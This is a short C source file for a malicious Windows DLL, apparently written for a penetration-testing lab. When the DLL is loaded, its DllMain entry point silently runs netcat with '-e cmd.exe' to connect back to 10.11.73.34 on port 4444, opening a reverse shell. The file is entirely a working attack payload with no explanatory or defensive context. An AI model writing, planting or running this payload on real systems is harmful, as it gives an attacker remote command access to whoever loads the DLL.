#include <windows.h>

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
            system("C:\\tools\\nc64.exe -e cmd.exe 10.11.73.34 4444");
    }

    return TRUE;
}